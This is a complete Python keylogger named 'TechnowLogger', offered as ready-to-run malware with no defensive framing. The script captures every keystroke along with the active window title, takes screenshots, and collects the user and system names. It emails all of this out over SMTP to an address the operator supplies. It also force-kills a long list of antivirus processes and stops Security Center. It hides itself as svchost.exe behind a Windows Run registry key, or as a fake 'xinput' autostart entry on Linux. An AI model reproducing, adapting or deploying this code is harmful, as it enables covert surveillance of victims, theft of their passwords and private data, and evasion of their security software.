#!/usr/bin/env python
import pynput.keyboard
import threading 
import smtplib
import os
import shutil
import subprocess
import sys
import stat
import platform
import getpass 
import time 
import tempfile
from mss import mss
# 15 to 18 lines for "send_mail_with_attachment()" function
#==============================================================
from email.mime.text import MIMEText              
from email.mime.multipart import MIMEMultipart  
from email.mime.application import MIMEApplication 
from os.path import basename    
#==============================================================
try:
    import win32gui as w   # Used to Get The Active Window Name
except Exception:
    pass

class Keylogger:
    def __init__(self, time_interval, email, password, smtp_server, smtp_port):
        self.log = ""
        self.interval = time_interval
        self.email = email
        self.password = password
        self.smtp_server = smtp_server
        self.smtp_port = smtp_port
        self.temp_screenshot = tempfile.gettempdir() + "\\screenshot.png"
        self.system_info = self.get_system_info()
        self.lastWindow = ""   #Used to Distinguish Log Data 
        self.victim_system = platform.system()

    def kill_av(self):
        try:
            os.popen("net stop \"Security Center\"")
        except Exception as e:
            print("[!] Unable to Disable Security Center!\n")
            print(f"Error : {e}")
        
        try:    
            avs=['AAWTray.exe', 'Ad-Aware.exe', 'MSASCui.exe', '_avp32.exe', '_avpcc.exe', '_avpm.exe', 'aAvgApi.exe', 'ackwin32.exe', 'adaware.exe', 'advxdwin.exe', 'agentsvr.exe', 'agentw.exe', 'alertsvc.exe', 'alevir.exe', 'alogserv.exe', 'amon9x.exe', 'anti-trojan.exe', 'antivirus.exe', 'ants.exe', 'apimonitor.exe', 'aplica32.exe', 'apvxdwin.exe', 'arr.exe', 'atcon.exe', 'atguard.exe', 'atro55en.exe', 'atupdater.exe', 'atwatch.exe', 'au.exe', 'aupdate.exe', 'auto-protect.nav80try.exe', 'autodown.exe', 'autotrace.exe', 'autoupdate.exe', 'avconsol.exe', 'ave32.exe', 'avgcc32.exe', 'avgctrl.exe', 'avgemc.exe', 'avgnt.exe', 'avgrsx.exe', 'avgserv.exe', 'avgserv9.exe', 'avguard.exe', 'avgw.exe', 'avkpop.exe', 'avkserv.exe', 'avkservice.exe', 'avkwctl9.exe', 'avltmain.exe', 'avnt.exe', 'avp.exe', 'avp.exe', 'avp32.exe', 'avpcc.exe', 'avpdos32.exe', 'avpm.exe', 'avptc32.exe', 'avpupd.exe', 'avsched32.exe', 'avsynmgr.exe', 'avwin.exe', 'avwin95.exe', 'avwinnt.exe', 'avwupd.exe', 'avwupd32.exe', 'avwupsrv.exe', 'avxmonitor9x.exe', 'avxmonitornt.exe', 'avxquar.exe', 'backweb.exe', 'bargains.exe', 'bd_professional.exe', 'beagle.exe', 'belt.exe', 'bidef.exe', 'bidserver.exe', 'bipcp.exe', 'bipcpevalsetup.exe', 'bisp.exe', 'blackd.exe', 'blackice.exe', 'blink.exe', 'blss.exe', 'bootconf.exe', 'bootwarn.exe', 'borg2.exe', 'bpc.exe', 'brasil.exe', 'bs120.exe', 'bundle.exe', 'bvt.exe', 'ccapp.exe', 'ccevtmgr.exe', 'ccpxysvc.exe', 'cdp.exe', 'cfd.exe', 'cfgwiz.exe', 'cfiadmin.exe', 'cfiaudit.exe', 'cfinet.exe', 'cfinet32.exe', 'claw95.exe', 'claw95cf.exe', 'clean.exe', 'cleaner.exe', 'cleaner3.exe', 'cleanpc.exe', 'click.exe', 'cmesys.exe', 'cmgrdian.exe', 'cmon016.exe', 'connectionmonitor.exe', 'cpd.exe', 'cpf9x206.exe', 'cpfnt206.exe', 'ctrl.exe', 'cv.exe', 'cwnb181.exe', 'cwntdwmo.exe', 'datemanager.exe', 'dcomx.exe', 'defalert.exe', 'defscangui.exe', 'defwatch.exe', 'deputy.exe', 'divx.exe', 'dllcache.exe', 'dllreg.exe', 'doors.exe', 'dpf.exe', 'dpfsetup.exe', 'dpps2.exe', 'drwatson.exe', 'drweb32.exe', 'drwebupw.exe', 'dssagent.exe', 'dvp95.exe', 'dvp95_0.exe', 'ecengine.exe', 'efpeadm.exe', 'emsw.exe', 'ent.exe', 'esafe.exe', 'escanhnt.exe', 'escanv95.exe', 'espwatch.exe', 'ethereal.exe', 'etrustcipe.exe', 'evpn.exe', 'exantivirus-cnet.exe', 'exe.avxw.exe', 'expert.exe', 'explore.exe', 'f-agnt95.exe', 'f-prot.exe', 'f-prot95.exe', 'f-stopw.exe', 'fameh32.exe', 'fast.exe', 'fch32.exe', 'fih32.exe', 'findviru.exe', 'firewall.exe', 'fnrb32.exe', 'fp-win.exe', 'fp-win_trial.exe', 'fprot.exe', 'frw.exe', 'fsaa.exe', 'fsav.exe', 'fsav32.exe', 'fsav530stbyb.exe', 'fsav530wtbyb.exe', 'fsav95.exe', 'fsgk32.exe', 'fsm32.exe', 'fsma32.exe', 'fsmb32.exe', 'gator.exe', 'gbmenu.exe', 'gbpoll.exe', 'generics.exe', 'gmt.exe', 'guard.exe', 'guarddog.exe', 'hacktracersetup.exe', 'hbinst.exe', 'hbsrv.exe', 'hotactio.exe', 'hotpatch.exe', 'htlog.exe', 'htpatch.exe', 'hwpe.exe', 'hxdl.exe', 'hxiul.exe', 'iamapp.exe', 'iamserv.exe', 'iamstats.exe', 'ibmasn.exe', 'ibmavsp.exe', 'icload95.exe', 'icloadnt.exe', 'icmon.exe', 'icsupp95.exe', 'icsuppnt.exe', 'idle.exe', 'iedll.exe', 'iedriver.exe', 'iexplorer.exe', 'iface.exe', 'ifw2000.exe', 'inetlnfo.exe', 'infus.exe', 'infwin.exe', 'init.exe', 'intdel.exe', 'intren.exe', 'iomon98.exe', 'istsvc.exe', 'jammer.exe', 'jdbgmrg.exe', 'jedi.exe', 'kavlite40eng.exe', 'kavpers40eng.exe', 'kavpf.exe', 'kazza.exe', 'keenvalue.exe', 'kerio-pf-213-en-win.exe', 'kerio-wrl-421-en-win.exe', 'kerio-wrp-421-en-win.exe', 'kernel32.exe', 'killprocesssetup161.exe', 'launcher.exe', 'ldnetmon.exe', 'ldpro.exe', 'ldpromenu.exe', 'ldscan.exe', 'lnetinfo.exe', 'loader.exe', 'localnet.exe', 'lockdown.exe', 'lockdown2000.exe', 'lookout.exe', 'lordpe.exe', 'lsetup.exe', 'luall.exe', 'luau.exe', 'lucomserver.exe', 'luinit.exe', 'luspt.exe', 'mapisvc32.exe', 'mcagent.exe', 'mcmnhdlr.exe', 'mcshield.exe', 'mctool.exe', 'mcupdate.exe', 'mcvsrte.exe', 'mcvsshld.exe', 'md.exe', 'mfin32.exe', 'mfw2en.exe', 'mfweng3.02d30.exe', 'mgavrtcl.exe', 'mgavrte.exe', 'mghtml.exe', 'mgui.exe', 'minilog.exe', 'mmod.exe', 'monitor.exe', 'moolive.exe', 'mostat.exe', 'mpfagent.exe', 'mpfservice.exe', 'mpftray.exe', 'mrflux.exe', 'msapp.exe', 'msbb.exe', 'msblast.exe', 'mscache.exe', 'msccn32.exe', 'mscman.exe', 'msconfig.exe', 'msdm.exe', 'msdos.exe', 'msiexec16.exe', 'msinfo32.exe', 'mslaugh.exe', 'msmgt.exe', 'msmsgri32.exe', 'mssmmc32.exe', 'mssys.exe', 'msvxd.exe', 'mu0311ad.exe', 'mwatch.exe', 'n32scanw.exe', 'nav.exe', 'navap.navapsvc.exe', 'navapsvc.exe', 'navapw32.exe', 'navdx.exe', 'navlu32.exe', 'navnt.exe', 'navstub.exe', 'navw32.exe', 'navwnt.exe', 'nc2000.exe', 'ncinst4.exe', 'ndd32.exe', 'neomonitor.exe', 'neowatchlog.exe', 'netarmor.exe', 'netd32.exe', 'netinfo.exe', 'netmon.exe', 'netscanpro.exe', 'netspyhunter-1.2.exe', 'netstat.exe', 'netutils.exe', 'nisserv.exe', 'nisum.exe', 'nmain.exe', 'nod32.exe', 'normist.exe', 'norton_internet_secu_3.0_407.exe', 'notstart.exe', 'npf40_tw_98_nt_me_2k.exe', 'npfmessenger.exe', 'nprotect.exe', 'npscheck.exe', 'npssvc.exe', 'nsched32.exe', 'nssys32.exe', 'nstask32.exe', 'nsupdate.exe', 'nt.exe', 'ntrtscan.exe', 'ntvdm.exe', 'ntxconfig.exe', 'nui.exe', 'nupgrade.exe', 'nvarch16.exe', 'nvc95.exe', 'nvsvc32.exe', 'nwinst4.exe', 'nwservice.exe', 'nwtool16.exe', 'ollydbg.exe', 'onsrvr.exe', 'optimize.exe', 'ostronet.exe', 'otfix.exe', 'outpost.exe', 'outpostinstall.exe', 'outpostproinstall.exe', 'padmin.exe', 'panixk.exe', 'patch.exe', 'pavcl.exe', 'pavproxy.exe', 'pavsched.exe', 'pavw.exe', 'pccwin98.exe', 'pcfwallicon.exe', 'pcip10117_0.exe', 'pcscan.exe', 'pdsetup.exe', 'periscope.exe', 'persfw.exe', 'perswf.exe', 'pf2.exe', 'pfwadmin.exe', 'pgmonitr.exe', 'pingscan.exe', 'platin.exe', 'pop3trap.exe', 'poproxy.exe', 'popscan.exe', 'portdetective.exe', 'portmonitor.exe', 'powerscan.exe', 'ppinupdt.exe', 'pptbc.exe', 'ppvstop.exe', 'prizesurfer.exe', 'prmt.exe', 'prmvr.exe', 'procdump.exe', 'processmonitor.exe', 'procexplorerv1.0.exe', 'programauditor.exe', 'proport.exe', 'protectx.exe', 'pspf.exe', 'purge.exe', 'qconsole.exe', 'qserver.exe', 'rapapp.exe', 'rav7.exe', 'rav7win.exe', 'rav8win32eng.exe', 'ray.exe', 'rb32.exe', 'rcsync.exe', 'realmon.exe', 'reged.exe', 'regedit.exe', 'regedt32.exe', 'rescue.exe', 'rescue32.exe', 'rrguard.exe', 'rshell.exe', 'rtvscan.exe', 'rtvscn95.exe', 'rulaunch.exe', 'run32dll.exe', 'rundll.exe', 'rundll16.exe', 'ruxdll32.exe', 'safeweb.exe', 'sahagent.exe', 'save.exe', 'savenow.exe', 'sbserv.exe', 'sc.exe', 'scam32.exe', 'scan32.exe', 'scan95.exe', 'scanpm.exe', 'scrscan.exe', 'serv95.exe', 'setup_flowprotector_us.exe', 'setupvameeval.exe', 'sfc.exe', 'sgssfw32.exe', 'sh.exe', 'shellspyinstall.exe', 'shn.exe', 'showbehind.exe', 'smc.exe', 'sms.exe', 'smss32.exe', 'soap.exe', 'sofi.exe', 'sperm.exe', 'spf.exe', 'sphinx.exe', 'spoler.exe', 'spoolcv.exe', 'spoolsv32.exe', 'spyxx.exe', 'srexe.exe', 'srng.exe', 'ss3edit.exe', 'ssg_4104.exe', 'ssgrate.exe', 'st2.exe', 'start.exe', 'stcloader.exe', 'supftrl.exe', 'support.exe', 'supporter5.exe', 'svc.exe', 'svchostc.exe', 'svchosts.exe', 'svshost.exe', 'sweep95.exe', 'sweepnet.sweepsrv.sys.swnetsup.exe', 'symproxysvc.exe', 'symtray.exe', 'sysedit.exe', 'system.exe', 'system32.exe', 'sysupd.exe', 'taskmg.exe', 'taskmgr.exe', 'taskmo.exe', 'taskmon.exe', 'taumon.exe', 'tbscan.exe', 'tc.exe', 'tca.exe', 'tcm.exe', 'tds-3.exe', 'tds2-98.exe', 'tds2-nt.exe', 'teekids.exe', 'tfak.exe', 'tfak5.exe', 'tgbob.exe', 'titanin.exe', 'titaninxp.exe', 'tracert.exe', 'trickler.exe', 'trjscan.exe', 'trjsetup.exe', 'trojantrap3.exe', 'tsadbot.exe', 'tvmd.exe', 'tvtmd.exe', 'undoboot.exe', 'updat.exe', 'update.exe', 'upgrad.exe', 'utpost.exe', 'vbcmserv.exe', 'vbcons.exe', 'vbust.exe', 'vbwin9x.exe', 'vbwinntw.exe', 'vcsetup.exe', 'vet32.exe', 'vet95.exe', 'vettray.exe', 'vfsetup.exe', 'vir-help.exe', 'virusmdpersonalfirewall.exe', 'vnlan300.exe', 'vnpc3000.exe', 'vpc32.exe', 'vpc42.exe', 'vpfw30s.exe', 'vptray.exe', 'vscan40.exe', 'vscenu6.02d30.exe', 'vsched.exe', 'vsecomr.exe', 'vshwin32.exe', 'vsisetup.exe', 'vsmain.exe', 'vsmon.exe', 'vsstat.exe', 'vswin9xe.exe', 'vswinntse.exe', 'vswinperse.exe', 'w32dsm89.exe', 'w9x.exe', 'watchdog.exe', 'webdav.exe', 'webscanx.exe', 'webtrap.exe', 'wfindv32.exe', 'whoswatchingme.exe', 'wimmun32.exe', 'win-bugsfix.exe', 'win32.exe', 'win32us.exe', 'winactive.exe', 'window.exe', 'windows.exe', 'wininetd.exe', 'wininitx.exe', 'winlogin.exe', 'winmain.exe', 'winnet.exe', 'winppr32.exe', 'winrecon.exe', 'winservn.exe', 'winssk32.exe', 'winstart.exe', 'winstart001.exe', 'wintsk32.exe', 'winupdate.exe', 'wkufind.exe', 'wnad.exe', 'wnt.exe', 'wradmin.exe', 'wrctrl.exe', 'wsbgate.exe', 'wupdater.exe', 'wupdt.exe', 'wyvernworksfirewall.exe', 'xpf202en.exe', 'zapro.exe', 'zapsetup3001.exe', 'zatutor.exe', 'zonalm2601.exe', 'zonealarm.exe']
            processes=os.popen('TASKLIST /FI "STATUS eq RUNNING" | find /V "Image Name" | find /V "="').read()
            ps=[]
            for i in processes.split(" "):
                if ".exe" in i:
                    ps.append(i.replace("K\n","").replace("\n",""))
            print("[*] Killing Antivirus services on this pc")
            for av in avs:
                for p in ps:
                    if p==av:
                        print("[*] killing off "+av)
                        os.popen("TASKKILL /F /IM {}".format(p))
        except Exception as e:
            print("[!] Unable to Kill AV")

    def append_to_log(self, string):
        self.log = self.log + string

    def get_system_info(self):
        uname = platform.uname()
        os = uname[0] + " " + uname[2] + " " + uname[3]
        computer_name = uname[1]
        user = getpass.getuser()
        return "Operating System:\t" + os + "\nComputer Name:\t\t" + computer_name + "\nUser:\t\t\t\t" + user

    def process_key_press(self, key):
        current_key = ""
        
        if self.victim_system == 'Windows':  
            try:
                CurrentWindowName = w.GetWindowText(w.GetForegroundWindow())
            
                if self.lastWindow != CurrentWindowName:
                    self.lastWindow = CurrentWindowName
                    current_key = f"\n\n[OnWard Data Entered In : {CurrentWindowName}]\n"
            except Exception:
                print("[!] Failed to Start \"Log Distinguisher Function\"")
            
        try:
            current_key += str(key.char)
        except AttributeError:
            if key == key.space:
                current_key += " "
                
            elif key == key.enter:
                current_key += " [ENTER] " 

            elif key == key.backspace:
                current_key += " [BACKSPACE] " 

            elif key == key.ctrl_l or key == key.ctrl_r:
                current_key += " [CTRL] " 

            elif key == key.shift or key == key.shift_r:
                current_key += " [SHIFT] " 

            elif key == key.delete:
                current_key += " [DELETE] " 

            elif key == key.esc:
                current_key += " [ESC] " 

            elif key == key.tab:
                current_key += " [TAB] "   

            elif key == key.up:
                current_key += " [UP] " 

            elif key == key.down:
                current_key += " [DOWN] " 

            elif key == key.left:
                current_key += " [LEFT] " 

            elif key == key.right:
                current_key += " [RIGHT] " 
                
            elif key == key.cmd or key == key.cmd_r:
                current_key += " [WINDOWS-KEY] " 

            elif key == key.f1:
                current_key += " [F1] "  

            elif key == key.f2:
                current_key += " [F2] " 

            elif key == key.f3:
                current_key += " [F3] "                 
                
            elif key == key.f4:
                current_key += " [F4] " 

            elif key == key.f5:
                current_key += " [F5] "  

            elif key == key.f6:
                current_key += " [F6] " 

            elif key == key.f7:
                current_key += " [F7] " 
                
            elif key == key.f8:
                current_key += " [F8] " 

            elif key == key.f9:
                current_key += " [F9] "                 
                
            elif key == key.f10:
                current_key += " [F10] " 

            elif key == key.f11:
                current_key += " [F11] "  

            elif key == key.f12:
                current_key += " [F12] " 

            elif key == key.alt_l or key == key.alt_r:
                current_key += " [ALT] "  

            elif key == key.caps_lock:
                current_key += " [CAPSLOCK] " 
                
            elif key == key.home:
                current_key += " [HOME] "                 
                
            else:
                current_key += " " + str(key) + " "
        self.append_to_log(current_key)

    def report(self):        
        self.send_mail(self.log)
        self.log = ""
        self.take_screenshot()
        self.send_mail_with_attachment(files= [self.temp_screenshot])
        timer = threading.Timer(self.interval, self.report)
        timer.start()

    def take_screenshot(self):
        try:
            os.remove('screenshot.png')
        except Exception as e:
            pass
        temp_dir = tempfile.gettempdir()
        os.chdir(temp_dir)
        with mss() as screenshot:
            screenshot.shot(output="screenshot.png")

    def send_mail(self, message):
        try:
            message = "Subject: TechnowLogger Reporting\n\n" + "Report From:\n\n" + self.system_info + "\n\nLogs:\n" + message
            server = smtplib.SMTP(self.smtp_server, self.smtp_port)
            server.starttls()
            server.login(self.email, self.password)
            server.sendmail(self.email, self.email, message)
            server.quit()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(15)
            self.send_mail(self.log)

    def send_mail_with_attachment(self, files= None):
        try:
            msg = MIMEMultipart()
            msg['From'] = self.email
            msg['To'] = self.email  
            msg['Subject'] = "TechnowLogger Reporting With Screenshot Attachments"
            text = "\nReport From:\n\n" + self.system_info 
            msg.attach(MIMEText(text))

            for f in files or []:
                with open(f, "rb") as fil: 
                    ext = f.split('.')[-1:]
                    attachedfile = MIMEApplication(fil.read(), _subtype = ext)
                    attachedfile.add_header(
                        'content-disposition', 'attachment', filename=basename(f) )
                msg.attach(attachedfile)

            smtp = smtplib.SMTP(host=self.smtp_server, port= self.smtp_port) 
            smtp.starttls()
            smtp.login(self.email, self.password)
            smtp.sendmail(self.email, self.email, msg.as_string())
            smtp.close()
        except Exception as e:
            print(f"Error: {e}")
            time.sleep(15)
            self.take_screenshot()            
            self.send_mail_with_attachment(files= [self.temp_screenshot])

    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()

    def become_persistent(self, time_persistent):
        if sys.platform.startswith("win"):
            self.become_persistent_on_windows(time_persistent)
        elif sys.platform.startswith("linux"):
            self.become_persistent_on_linux(time_persistent)

    def become_persistent_on_windows(self, time_persistent):
        evil_file_location = os.environ["appdata"] + "\\svchost.exe"
        if not os.path.exists(evil_file_location):
            time.sleep(time_persistent)
            self.log = "** TechNowlogger started on Windows System ** "
            shutil.copyfile(sys.executable, evil_file_location)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v svchost /t REG_SZ /d "' + evil_file_location + '"', shell=True)

    def become_persistent_on_linux(self, time_persistent):
        home_config_directory = os.path.expanduser('~') + "/.config/"
        autostart_path = home_config_directory + "/autostart/"
        autostart_file = autostart_path + "xinput.desktop"
        if not os.path.isfile(autostart_file):
            time.sleep(time_persistent)
            self.log = "** TechNowlogger started On Linux System **"
            try:
                os.makedirs(autostart_path)
            except OSError:
                pass

            destination_file = home_config_directory + "xnput"
            shutil.copyfile(sys.executable, destination_file)
            self.chmod_to_exec(destination_file)

            with open(autostart_file, 'w') as out:
                out.write("[Desktop Entry]\nType=Application\nX-GNOME-Autostart-enabled=true\n")
                out.write("Name=Xinput\nExec=" + destination_file + "\n")

            self.chmod_to_exec(autostart_file)
            subprocess.Popen(destination_file)
            sys.exit()

    def chmod_to_exec(self, file):
        os.chmod(file, os.stat(file).st_mode | stat.S_IEXEC)

if __name__ == '__main__':
    email = input("[?] Enter Email : ")
    password = input("[?] Enter Password : ")
    interval = int(input("[?] Time Interval to Send Emails [DEFAULT: 120] : "))
    time_persistent = int(input("[?] Become Persistence After __ Seconds [DEFAULT: 10] : "))
    
    if interval == "":
        interval = 120
        
    if time_persistent == "":
        time_persistent = 10
    
    test = Keylogger(interval, email, password, "smtp.gmail.com", 587)
    test.kill_av()        
    test.become_persistent(time_persistent)
    test.start()
